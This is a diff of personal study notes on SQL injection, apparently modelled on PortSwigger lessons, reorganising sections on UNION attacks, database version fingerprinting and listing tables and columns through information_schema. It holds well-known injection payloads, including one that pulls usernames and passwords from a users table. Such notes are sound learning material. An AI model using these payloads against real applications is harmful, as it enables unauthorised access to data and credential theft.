@@ -7,6 +7,23 @@ simple attack -> `'+OR+1=1--`  [[OLD/WEB/vulnerabilities/SQL Injection/attack/pa
 <mark style="background: #FFB86CA6;">to retrieve data from other tables</mark> ->
 - The individual queries must return the **same number of columns**.
 - The **data types** in each column must be compatible between the individual queries.
+
+### Examining the database [[SQLi#DBMS Identification |payloads]]
+- database type and version [[OLD/WEB/vulnerabilities/SQL Injection/attack/payload#Examining the database|examples]]
+	- _Microsoft, MySQL_ -> `SELECT @@version`
+	- _PostgreSQL_ -> `SELECT version()`
+	- _Oracle_ -> `SELECT * FROM v$version`
+### Listing the contents 
+- _Oracle_ [[OLD/WEB/vulnerabilities/SQL Injection/attack/payload#Listing the contents|examples]]
+  - `all_tables`
+  - `all_tab_columns`
+- _all other databases_ -> `information_schema` 
+  - `information_schema.schemata` -> shows all database which the user has access to
+  - `information_schema.tables` -> shows all tables which the user has access to
+  - `information_schema.columns` -> shows all columns which the user has access to
+```mysql 
+select group_concat(column_name) from information_schema.columns where table_schema='DATABASE_NAME' and table_name='TABLE_NAME' #returns only column names for a specific database and table 
+```
 ### 1) number of columns required
 - use `ORDER BY` -> `' ORDER BY [number]--` until you hit an error
 - use `UNION SELECT` -> `' UNION SELECT NULL,NULL[...]--` -> until additional row in the result set (it is possible to get erros like `NullPointerException` or even same response as without null ) 
@@ -27,20 +44,6 @@ simple attack -> `'+OR+1=1--`  [[OLD/WEB/vulnerabilities/SQL Injection/attack/pa
 #### multiple values within a single column
 - use String Concatenation (different databases use different syntax) [[cheatsheet(portswigger)#String concatenation|see cheatsheet]]
 	- example: `||` ->  `' UNION SELECT username || '~' || password FROM users--`  
-### Examining the database
-
-- database type and version [[OLD/WEB/vulnerabilities/SQL Injection/attack/payload#Examining the database|examples]]
-	- _Microsoft, MySQL_ -> `SELECT @@version`
-	- _PostgreSQL_ -> `SELECT version()`
-	- _Oracle_ -> `SELECT * FROM v$version`
-### Listing the contents 
-
-- _Oracle_ [[OLD/WEB/vulnerabilities/SQL Injection/attack/payload#Listing the contents|examples]]
-  - `all_tables`
-  - `all_tab_columns`
-- _all other databases_ -> `information_schema` 
-  - `information_schema.tables`
-  - `information_schema.columns`
 
 # Inferential(Blind) SQL injection
 ##### concept:
@@ -75,9 +78,6 @@ look for syntax in different databases -> [[cheatsheet(portswigger)#Time delays|
 ## out-of-band (OAST) techniques
 #todo 
 
-# Subverting application logic
-
-simple attack -> `'--` [[OLD/WEB/vulnerabilities/SQL Injection/attack/payload#Subverting application logic#simple attack|example]]
 # Second-order SQL injection 
 #todo 
 
